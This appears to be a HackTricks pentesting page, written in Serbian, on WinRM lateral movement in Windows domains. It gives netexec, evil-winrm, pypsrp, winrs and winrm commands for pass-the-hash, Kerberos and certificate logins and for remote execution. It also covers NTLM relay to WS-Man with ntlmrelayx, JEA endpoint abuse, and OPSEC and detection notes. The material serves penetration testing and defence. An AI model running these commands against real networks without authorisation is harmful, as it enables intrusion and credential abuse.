# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM je jedan od najpraktičnijih transporta za **lateral movement** u Windows okruženjima jer omogućava udaljeni shell preko **WS-Man/HTTP(S)** bez potrebe za trikovima sa kreiranjem SMB servisa. Ako target izlaže **5985/5986** i vaš principal ima dozvolu za remoting, često možete vrlo brzo preći sa "valid creds" na "interactive shell".

Za **enumeration protokola/servisa**, listeners, enabling WinRM, `Invoke-Command`, i generičku upotrebu klijenta, pogledajte:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Why operators like WinRM

- Koristi **HTTP/HTTPS** umesto SMB/RPC, pa često radi tamo gde je PsExec-style execution blokiran.
- Sa **Kerberos**, ne šalje reusable credentials ka targetu.
- Radi čisto sa **Windows**, **Linux**, i **Python** alatima (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Interaktivni PowerShell remoting path pokreće **`wsmprovhost.exe`** na targetu pod kontekstom autentifikovanog korisnika, što je operativno drugačije od exec-a zasnovanog na servisu.

## Access model and prerequisites

U praksi, uspešan WinRM lateral movement zavisi od **tri** stvari:

1. Target ima **WinRM listener** (`5985`/`5986`) i firewall pravila koja dozvoljavaju pristup.
2. Account može da se **authentifikuje** na endpoint.
3. Account ima dozvolu da **otvori remoting session**.

Uobičajeni načini da se dobije taj pristup:

- **Local Administrator** na targetu.
- Membership u **Remote Management Users** na novijim sistemima ili **WinRMRemoteWMIUsers__** na sistemima/komponentama koje i dalje poštuju tu grupu.
- Eksplicitna remoting prava delegirana kroz local security descriptors / PowerShell remoting ACL changes.

Ako već kontrolišete box sa admin pravima, imajte na umu da takođe možete **delegirati WinRM access bez punog membership-a u admin grupi** koristeći tehnike opisane ovde:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas that matter during lateral movement

- **Kerberos zahteva hostname/FQDN**. Ako se povezujete preko IP adrese, klijent obično prelazi na **NTLM/Negotiate**.
- U **workgroup** ili cross-trust edge case-ovima, NTLM obično zahteva ili **HTTPS** ili da target bude dodat u **TrustedHosts** na klijentu.
- Sa **local accounts** preko Negotiate u workgroup-u, UAC remote restrictions mogu da spreče pristup osim ako se ne koristi ugrađeni Administrator account ili `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting podrazumevano koristi **`HTTP/<host>` SPN**. U okruženjima gde je **`HTTP/<host>`** već registrovan za neki drugi service account, WinRM Kerberos može da padne sa `0x80090322`; koristite port-qualified SPN ili pređite na **`WSMAN/<host>`** gde taj SPN postoji.

Ako dobijete valid credentials tokom password spraying-a, validacija preko WinRM je često najbrži način da proverite da li se pretvaraju u shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec for validation and one-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM za interaktivne shell-ove

`evil-winrm` i dalje ostaje najpraktičnija interaktivna opcija sa Linuxa zato što podržava **lozinke**, **NT hash-eve**, **Kerberos tikete**, **client certificates**, prenos fajlova i in-memory PowerShell/.NET loading.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPN edge case: `HTTP` vs `WSMAN`

Kada podrazumevani **`HTTP/<host>`** SPN uzrokuje Kerberos greške, pokušajte da zatražite/koristite **`WSMAN/<host>`** ticket umesto toga. Ovo se pojavljuje u ojačanim ili neobičnim enterprise okruženjima gde je **`HTTP/<host>`** već dodeljen drugom service account-u.
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Ovo je takođe korisno nakon zloupotrebe **RBCD / S4U** kada ste posebno falsifikovali ili zatražili **WSMAN** servisni tiket umesto generičkog `HTTP` tiketa.

### Certificate-based authentication

WinRM takođe podržava **client certificate authentication**, ali sertifikat mora biti mapiran na ciljnom sistemu na **local account**. Sa ofanzivne tačke gledišta, ovo je važno kada:

- ste već ukrali/izvezli važeći client certificate i private key koji su već mapirani za WinRM;
- ste zloupotrebili **AD CS / Pass-the-Certificate** da biste dobili sertifikat za principal i zatim pivotirali u drugi authentication path;
- radite u okruženjima koja namerno izbegavaju password-based remoting.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM je mnogo ređi od password/hash/Kerberos autentikacije, ali kada postoji može da obezbedi **passwordless lateral movement** putanju koja opstaje i nakon rotacije lozinke.

### Python / automatizacija sa `pypsrp`

Ako vam treba automatizacija umesto operator shell-a, `pypsrp` vam daje WinRM/PSRP iz Python-a sa podrškom za **NTLM**, **certificate auth**, **Kerberos** i **CredSSP**.
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
Ako vam je potrebna finija kontrola od visoko-nivojskog `Client` wrappera, niženivojski `WSMan` + `RunspacePool` APIs su korisni za dva česta operator problema:

- forsiranje **`WSMAN`** kao Kerberos service/SPN umesto podrazumevanog `HTTP` očekivanja koje koristi mnogo PowerShell klijenata;
- povezivanje na **non-default PSRP endpoint** kao što je **JEA** / custom session configuration umesto `Microsoft.PowerShell`.
```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
"srv01.domain.local",
auth="kerberos",
ssl=False,
negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
ps.add_script("whoami; Get-Command")
output = ps.invoke()
print(output)
```
### Prilagođeni PSRP endpointi i JEA su važni tokom lateralnog kretanja

Uspešna WinRM autentikacija **ne** znači uvek da ste završili na podrazumevanom neograničenom `Microsoft.PowerShell` endpointu. Zrela okruženja mogu izlagati **prilagođene session configurations** ili **JEA** endpointove sa sopstvenim ACL-ovima i ponašanjem pri pokretanju kao drugi korisnik.

Ako već imate code execution na Windows hostu i želite da utvrdite koje remoting površine postoje, nabrojte registrovane endpointove:
```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```
Kada postoji koristan endpoint, ciljajte ga eksplicitno umesto default shell-a:
```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```
Praktične ofanzivne implikacije:

- **Restriktivan** endpoint i dalje može biti dovoljan za lateral movement ako izlaže baš prave cmdlets/functions za kontrolu servisa, pristup fajlovima, kreiranje procesa ili proizvoljno .NET / eksterno izvršavanje komandi.
- **Pogrešno konfigurisan JEA** role je posebno vredan kada izlaže opasne komande kao što su `Start-Process`, široke wildcards, writable providers, ili custom proxy functions koje omogućavaju da izađeš iz predviđenih ograničenja.
- Endpointi zasnovani na **RunAs virtual accounts** ili **gMSAs** menjaju efektivni security context komandi koje pokrećeš. Konkretno, gMSA-backed endpoint može da obezbedi **network identity na drugom hop-u** čak i kada bi obična WinRM sesija naišla na klasični delegation problem.

## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe` je ugrađen i koristan kada želiš **native WinRM command execution** bez otvaranja interaktivne PowerShell remoting sesije:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Dva parametra je lako zaboraviti, a u praksi su bitni:

- `/noprofile` je često potreban kada udaljeni principal **nije** lokalni administrator.
- `/allowdelegate` omogućava udaljenoj shell sesiji da koristi vaše kredencijale protiv **trećeg hosta** (na primer, kada komandi treba `\\fileserver\share`).
```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```
Operativno, `winrs.exe` često rezultira udaljenim lancem procesa sličnim sledećem:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Ovo je vredno zapamtiti jer se razlikuje od service-based exec i od interaktivnih PSRP sesija.

### `winrm.cmd` / WS-Man COM umesto PowerShell remoting

Možete takođe izvršavati preko **WinRM transport** bez `Enter-PSSession` tako što pozivate WMI klase preko WS-Man. Ovo zadržava transport kao WinRM, dok udaljeni izvršni mehanizam postaje **WMI `Win32_Process.Create`**:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Taj pristup je koristan kada:

- PowerShell logging je snažno nadgledan.
- Želite **WinRM transport** ali ne i klasičan PS remoting workflow.
- Pravite ili koristite custom tooling oko **`WSMan.Automation`** COM objekta.

## NTLM relay to WinRM (WS-Man)

Kada je SMB relay blokiran potpisivanjem i LDAP relay je ograničen, **WS-Man/WinRM** i dalje može biti atraktivna relay meta. Moderni `ntlmrelayx.py` uključuje **WinRM relay servers** i može da radi relay ka **`wsman://`** ili **`winrms://`** targetima.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Dve praktične napomene:

- Relay je najkorisniji kada target prihvata **NTLM** i kada je relayed principalu dozvoljeno da koristi WinRM.
- Noviji Impacket kod posebno obrađuje zahteve **`WSMANIDENTIFY: unauthenticated`**, tako da probe tipa `Test-WSMan` ne prekidaju relay flow.

Za multi-hop ograničenja nakon što ostvarite prvu WinRM sesiju, pogledajte:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC i napomene o detekciji

- **Interaktivni PowerShell remoting** obično kreira **`wsmprovhost.exe`** na targetu.
- **`winrs.exe`** obično kreira **`winrshost.exe`** i zatim traženi child process.
- Custom **JEA** endpoints mogu izvršavati akcije kao **`WinRM_VA_*`** virtual accounts ili kao konfigurisan **gMSA**, što menja i telemetry i ponašanje drugog hopa u poređenju sa običnim user-context shell-om.
- Očekujte **network logon** telemetry, WinRM service događaje i PowerShell operational/script-block logging ako koristite PSRP umesto čistog `cmd.exe`.
- Ako vam treba samo jedna komanda, `winrs.exe` ili jednokratno WinRM izvršavanje mogu biti tiši od dugotrajne interaktivne remoting sesije.
- Ako je Kerberos dostupan, preferirajte **FQDN + Kerberos** umesto IP + NTLM da biste smanjili i trust probleme i nezgodne izmene na klijentu vezane za `TrustedHosts`.

## Reference

- [Microsoft: JEA Security Considerations](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [pypsrp README](https://github.com/jborean93/pypsrp)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)


{{#include ../../banners/hacktricks-training.md}}
